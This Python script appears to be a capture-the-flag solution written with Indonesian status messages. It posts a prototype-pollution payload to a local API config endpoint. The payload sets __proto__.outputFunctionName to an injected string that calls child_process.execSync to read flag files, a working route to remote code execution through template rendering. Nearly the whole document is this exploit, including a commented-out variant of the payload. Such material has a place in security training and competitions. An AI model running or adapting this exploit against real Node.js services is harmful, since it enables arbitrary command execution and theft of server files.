import requests
import json

TARGET_URL = "http://localhost:3814/api/config"

def solve():
    print("[+] Starting exploit...")

    # payload_content = "a; return global.process.mainModule.require('child_process').execSync('cat /flag*.txt').toString(); //"
    payload_content = "a; __append(process.mainModule.require('child_process').execSync('cat /flag*.txt').toString()); s"

    payload = {
        "path": ["__proto__", "outputFunctionName"],
        "value": payload_content
    }

    headers = {
        "Content-Type": "application/json"
    }

    print(f"[+] Mengirimkan Payload: {json.dumps(payload)}")

    try:
        response = requests.post(TARGET_URL, json=payload, headers=headers)
        print("\n[+] Respons dari Server:")
        print(response.text)

        if "HOLOGY9{" in response.text:
            print("[+] Flag ditemukan!")
        else:
            print("[-] Flag tidak ditemukan.")

    except Exception as e:
        print(f"[-] Terjadi kesalahan: {e}")

if __name__ == "__main__":
    solve()
